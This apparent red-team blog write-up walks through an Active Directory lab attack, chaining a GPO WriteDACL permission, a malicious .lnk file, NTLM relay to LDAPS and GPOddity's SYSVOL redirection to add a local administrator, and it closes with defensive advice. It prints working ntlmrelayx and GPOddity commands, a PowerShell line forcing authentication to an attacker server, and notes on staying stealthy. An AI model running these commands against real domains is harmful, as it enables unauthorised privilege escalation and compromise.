---
title: "Abusing GPO Delegation - From WriteDACL to Local Admin via NTLM Relay and SYSVOL Hijacking"
author: Eray
date: 2025-12-30 00:00:00 +0300
categories: [AD-Security, Red-Team]
tags: [writeDACL, Abuse-GPO, AD, Pentesting]
toc: true
image:
    path: /assets/abuseGPO_1/1_img.jpg
    alt: "Abusing GPO Delegation - From WriteDACL to Local Admin via NTLM Relay and SYSVOL Hijacking"
---

**Introduction**
In Active Directory environments, Group Policy Objects (GPOs) are one of the most powerful management mechanisms. However, when GPO delegation is misconfigured, even users without Domain Admin privileges can achieve severe impact.

This post demonstrates how a single WriteDACL permission on a GPO can be abused to gain local administrator access on a target system — by chaining together NTLM relay, automation abuse, and GPO manipulation using GPOddity.

The entire attack was performed without direct Domain Admin privileges and relied solely on abusing legitimate AD functionality.


**Initial Access Vector — Overly Permissive GPO**
During enumeration, a GPO named “A Policy” was identified.
The user SINCE1907 had WriteDACL permissions on this GPO — a subtle but highly dangerous misconfiguration.

While this permission does not directly allow modifying GPO content, it enables modification of who is allowed to modify the GPO, which becomes extremely powerful when combined with other techniques.

**Discovery: Automated LNK Execution on FILESRV-05**
Further enumeration revealed a network share:

```bash
\\filesrv-05\A-share
```

Key observations:

The share was accessible to Everyone
A background automation script was actively monitoring this directory
Any .lnk file dropped into the directory was automatically executed
Execution occurred under the security context of the SINCE1907 user
This behavior effectively created an execution primitive — ideal for triggering authentication attempts and abusing NTLM.

![A-SHARE](/assets/abuseGPO_1/1.png)

**NTLM Relay Setup**
To abuse this behavior, *ntlmrelayx.py* from the Impacket toolkit was used.

```bash
sudo ntlmrelayx.py -t ldaps://172.16.2.10 -wh 172.16.2.20 --http-port 80,8080 -i --no-smb-server
```

**Explanation:**

* -t ldaps://172.16.2.10: Relay authentication directly to the Domain Controller over LDAPS
* -wh 172.16.2.20: Rogue web server used to capture NTLM authentication
* -i: Enables an interactive LDAP shell upon successful relay
* --no-smb-server: SMB relay not required in this scenario

**Triggering Authentication via LNK File**
A malicious *.lnk* file was created containing the following payload:

```bash
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.2.20' -UseDefaultCredentials"
```
This forces the system to authenticate using the current user’s credentials when the shortcut is executed.

![Create Shortcut](/assets/abuseGPO_1/2.png)

Once the *.lnk* file was dropped into the monitored directory:

```bash
\\filesrv-05\A-share
```

The automation mechanism executed it under the *SINCE1907* context, triggering an NTLM authentication attempt.

![NTLM_Auth_Attempt](/assets/abuseGPO_1/3.png)

**LDAP Relay & Privilege Escalation**
The NTLM authentication was successfully relayed to the Domain Controller over LDAPS.

An interactive LDAP shell became available on port *11000:*

```bash
nc 127.0.0.1 11000
```

From this shell, the ACL of the *“A Policy”* GPO was modified to grant *WriteDACL* privileges to a controlled user account (*canbartu*).

```bash
write_gpo_dacl canbartu {0BF8D01C-1F62-4BDC-958C-57140B67D147}
```
At this stage, control over the GPO was effectively obtained.

**Weaponizing the GPO with GPOddity**
Using GPOddity, a malicious GPO template was generated to add the user *canbartu* to the *local Administrators group* on targeted machines.

```bash
sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'fbrepublic.local' --username 'canbartu' --password 'XXXX' --command 'net localgroup administrators canbartu /add' --rogue-smbserver-ip '172.16.2.20' --rogue-smbserver-share 'can-gp' --dc-ip '172.16.2.10' --smb-mode none
```

**Note: The account used here was intentionally created for this attack simulation.**

To allow domain machines to access the rogue SYSVOL location, both SMB share and NTFS permissions were configured:

```bash
net share can-gp=C:\AD\Tools\can-gp
icacls "C:\AD\Tools\can-gp" /grant Everyone:F /T
```

**Verifying GPO Hijack via gPCFileSysPath**
To confirm successful GPO hijacking, the following PowerView command was used:

```bash
Get-DomainGPO -Identity 'A Policy'
```
Output:

```bash
gpcfilesyspath : \\172.16.1.20\can-gp
```

This confirms that the GPO now points to a rogue SYSVOL path controlled by the attacker.

At this point, the malicious GPO is executed by domain machines.

**Impact Confirmation**
Accessing the target system:
```bash
winrs -r:filesrv-05 cmd /c "set computername && set username"
```
Output: 
```bash
COMPUTERNAME=FILESRV-05
USERNAME=CANBARTU
```

The attacker now has *local administrator privileges* on the target system.

**Conclusion**
This scenario clearly demonstrates how a *single misconfiguration* in Active Directory can be chained into a high-impact compromise. What initially appears to be a minor permission issue a WriteDACL permission on a GPO can ultimately lead to local administrator access when combined with *NTLM relay*, automation abuse, and controlled GPO manipulation.

One of the most critical aspects of this attack is that *no Domain Admin privileges were required at any stage*. Every step leveraged legitimate Active Directory functionality, making the attack path both realistic and difficult to detect. This significantly increases the operational risk in environments where GPO delegation is not carefully audited.

A particularly impactful technique in this chain was the manipulation of the *gPCFileSysPath* attribute. By redirecting the GPO to a rogue SYSVOL location, domain-joined systems unknowingly consumed attacker-controlled policy content. From the system’s perspective, this behavior was completely legitimate  it was simply applying Group Policy as designed.

**OPSEC Perspective: Why SYSVOL?**
Using SYSVOL as the delivery mechanism was not only a technical decision, but also a deliberate operational security (OPSEC) choice.

SYSVOL is a trusted, continuously accessed component of Active Directory. Domain-joined systems routinely read from it, and its traffic patterns are considered normal in almost all enterprise environments. As a result, activity involving SYSVOL rarely raises suspicion.

By redirecting the *gPCFileSysPath* to an attacker-controlled UNC path, the attack blended seamlessly into normal domain operations. This approach avoided:

*Creating new services
*Dropping suspicious binaries
*Introducing abnormal process trees

Instead, it abused existing Group Policy behavior, allowing the attack to remain stealthy and persistent.

From a defensive perspective, this technique is particularly dangerous because:

* Network traffic appears legitimate
* PowerShell logging may not be triggered depending on the environment configuration
* No obvious behavioral anomalies are generated

This aligns perfectly with a high-impact, low-noise attack philosophy.

**Final Thoughts**
This scenario highlights an important reality of modern Active Directory security:

**Compromises rarely originate from a single critical vulnerability — they emerge from small, chained misconfigurations.**

To reduce exposure, organizations should:

* Regularly audit GPO delegations, especially WriteDACL permissions
* Monitor and restrict NTLM usage wherever possible
* Continuously validate SYSVOL integrity and access patterns
* Reassess automation workflows from a security-first perspective
  
Ultimately, effective defense is not just about patching vulnerabilities — it requires understanding how attackers think, and how legitimate system functionality can be abused when trust boundaries are overlooked.

Thanks for reading. 
Happy Hacking^^

References:
[iredteam](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces?source=post_page-----7a1862486f88---------------------------------------)

